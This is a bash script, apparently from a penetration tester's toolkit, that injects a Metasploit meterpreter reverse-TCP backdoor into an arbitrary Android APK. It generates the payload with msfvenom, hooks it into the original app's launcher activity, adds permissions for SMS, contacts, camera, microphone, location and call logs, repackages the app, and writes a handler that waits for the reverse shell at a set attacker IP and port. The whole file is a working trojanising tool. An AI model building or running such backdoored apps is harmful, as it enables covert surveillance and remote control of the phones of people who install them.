#!/bin/bash

###########################################
#  This script is a script for injecting  #
#  metasploit payloads on arbitrary APKs. # 
###########################################

java_bin=$(command -v java)
msfvenom_cmd=$(command -v msfvenom)
msfdb_cmd=$(command -v msfdb)
apktool_jar="${HOME}/pentest/mobile-tools/android/apktool.jar"
apksigner_sh="${HOME}/Android/Sdk/build-tools/31.0.0/apksigner"

msfvenom_payload="android/meterpreter/reverse_tcp"
attacker_ip=192.168.3.8
attacker_port=4444

apk_original="${HOME}/Documentos/ibliss/clientes/toro/br.com.invistacompi.apk"
apk_injected="$(basename "${apk_original}" .apk)-injected"
apk_meterpreter="meterpreter.apk"
apk_backdoor_injection_log=/tmp/apk_backdoor_injection.log

dir_to_work="/tmp/workspace"

[[ -d "${dir_to_work}" ]] && rm -rf "${dir_to_work}" ; mkdir -p "${dir_to_work}"
[[ ! -d "${dir_to_work}" ]] && mkdir -p "${dir_to_work}"
[[ -s "${dir_to_work}/${apk_meterpreter}" ]] && rm -rf "${dir_to_work}/${apk_meterpreter}"
[[ -s "${dir_to_work}/${apk_meterpreter%.apk}" ]] && rm -rf "${dir_to_work}/${apk_meterpreter%.apk}"
[[ -s "${dir_to_work}/${apk_injected}" ]] && rm -rf "${dir_to_work}/${apk_injected}"

if [ ! -s "${apktool_jar}" ]; then
    echo "You haven\'t the apktool."
    echo "Please, inform the correct path to apktool."
    exit 1
fi

if [ -z "${msfvenom_cmd}" ] || [ -z "${msfdb_cmd}" ]; then
    echo "You haven\'t the metasploit installed."
    echo "Please install the metasploit to continue."
    exit 1
elif [ -z "${msfvenom_payload}" ] || \
    [ -z "${attacker_ip}" ] || \
    [ -z "${attacker_port}" ] || \
    [ -z "${apk_meterpreter}" ]; then
    echo "One of necessary variable is empty."
    exit 1
else
    [[ -z $("${msfdb_cmd}" --component webservice status 2> /dev/null | grep "is running as PID" | awk '{print $8}') ]] && \
       "${msfdb_cmd}" --component webservice start 2> /dev/null 
    echo -n "Build an infected apk... "
    "${msfvenom_cmd}" -p "${msfvenom_payload}" LHOST="${attacker_ip}" LPORT="${attacker_port}" -o "${dir_to_work}/${apk_meterpreter}" > "${apk_backdoor_injection_log}" 2>&1
    if [ -s "${dir_to_work}/${apk_meterpreter}" ]; then
        echo "Done!"
        echo -n "Decompiling the ${apk_meterpreter}... "
        "${java_bin}" -jar "${apktool_jar}" d "${dir_to_work}/${apk_meterpreter}" -f -o "${dir_to_work}/${apk_meterpreter%.apk}" > "${apk_backdoor_injection_log}" 2>&1
        if [ ! -z "$(ls -A -- "${dir_to_work}/${apk_meterpreter%.apk}")" ]; then
            echo "Done!"
        else
            echo "The process of decompiling ${apk_meterpreter} failed!"
            cat "${apk_backdoor_injection_log}"
            exit 1
        fi
    else
        echo -e "\nThe infected apk ("${dir_to_work}/${apk_meterpreter}") does not exist!"
        cat "${apk_backdoor_injection_log}"
        exit 1
    fi
fi

if [ -s "${apk_original}" ]; then
    echo -n "Decompiling the ${apk_original}... "
    "${java_bin}" -jar "${apktool_jar}" d "${apk_original}" -f -o "${dir_to_work}/${apk_injected}" > "${apk_backdoor_injection_log}" 2>&1
    if [ ! -z "$(ls -A -- "${dir_to_work}/${apk_injected}")" ]; then
        echo "Done!"
    else
        echo "The process of decompiling ${apk_original} failed!"
        cat "${apk_backdoor_injection_log}"
        exit 1
    fi
else
    echo "The file ${apk_original} does not exist!"
    exit 1
fi

echo -n "Copying the backdoor to original apk... "
[[ -d "${dir_to_work}/${apk_meterpreter%.apk}/smali/com/metasploit/stage" && -d "${dir_to_work}/${apk_injected}/smali/com" ]] && \
    mkdir -p "${dir_to_work}/${apk_injected}/smali/com/metasploit/stage" ; \
    cp -ar "${dir_to_work}/${apk_meterpreter%.apk}/smali/com/metasploit/stage/Payload.smali" "${dir_to_work}/${apk_injected}/smali/com/metasploit/stage/"
echo "Done!"

echo -n "Looking for the correct smali file with appropriate activity... "
file_to_inject=$(find "${dir_to_work}/${apk_injected}" -type f | grep -E "$(grep -B2 -e android.intent.action.MAIN -e android.intent.category.LAUNCHER "${dir_to_work}/${apk_injected}/AndroidManifest.xml" | grep activity | head -n1 | sed -e 's/[[:space:]].*android:name=//' -e 's/[[:space:]].*//' -e 's/"//g' -e 's/\./\//g').smali$")
echo -e "Done!\nFile to inject: ${file_to_inject}"

echo -n "Injecting the hook into the appropriate activity of the original apk... "
sed -i "/invoke-super.{p0,.p1},.*;->onCreate(Landroid\/os\/Bundle;)V/ a \    invoke-static {p0}, Lcom\/metasploit\/stage\/Payload;->start(Landroid\/content\/Context;)V" "${file_to_inject}"
echo "Done!"

echo -n "Injecting the permissions in the AndroidManifest.xml file... "
cp "${dir_to_work}/${apk_injected}/AndroidManifest.xml" "${dir_to_work}/${apk_injected}/AndroidManifest.xml.0"
[[ ! $(grep -q android.permission.SET_WALLPAPER "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.INTERNET "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.INTERNET\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.ACCESS_WIFI_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.CHANGE_WIFI_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.ACCESS_NETWORK_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>"\
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.ACCESS_COARSE_LOCATION "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.ACCESS_FINE_LOCATION "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.READ_PHONE_STATE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.READ_SMS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_SMS\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.SEND_SMS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SEND_SMS\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.RECEIVE_SMS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.RECORD_AUDIO "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.CALL_PHONE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.READ_CONTACTS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.WRITE_CONTACTS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.WRITE_SETTINGS "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.CAMERA "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CAMERA\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.WRITE_EXTERNAL_STORAGE "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.RECEIVE_BOOT_COMPLETED "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.READ_CALL_LOG "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.WRITE_CALL_LOG "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q android.permission.WAKE_LOCK "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q \"android.hardware.camera\" "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera\"/>"\
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q \"android.hardware.camera.autofocus\" "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
[[ ! $(grep -q \"android.hardware.microphone\" "${dir_to_work}/${apk_injected}/AndroidManifest.xml") ]] && \
    sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.microphone\"/>" \
    "${dir_to_work}/${apk_injected}/AndroidManifest.xml"
echo "Done!"

if [[ -n $(grep metasploit "${file_to_inject}") ]]; then
    echo -n "Packing the injected apk with a backdoor ${dir_to_work}/${apk_injected}... "
    "${java_bin}" -jar "${apktool_jar}" b "${dir_to_work}/${apk_injected}" -o "${dir_to_work}/${apk_injected}.apk" > "${apk_backdoor_injection_log}" 2>&1
    if [ -s "${dir_to_work}/${apk_injected}.apk" ]; then
        echo "Done!"
    else
        echo "Failed!"
        cat "${apk_backdoor_injection_log}"
        exit 1
    fi
fi

echo "Open the metasploit..."
echo "use exploit/multi/handler" >> /tmp/meterpreter_apk_backdoor.rc
echo "set PAYLOAD android/meterpreter/reverse_tcp" >> /tmp/meterpreter_apk_backdoor.rc
echo "set LHOST ${attacker_ip}" >> /tmp/meterpreter_apk_backdoor.rc
echo "set LPORT ${attacker_port}" >> /tmp/meterpreter_apk_backdoor.rc
echo "exploit -j -z" >> /tmp/meterpreter_apk_backdoor.rc
#msfconsole -r /tmp/meterpreter_apk_backdoor.rc
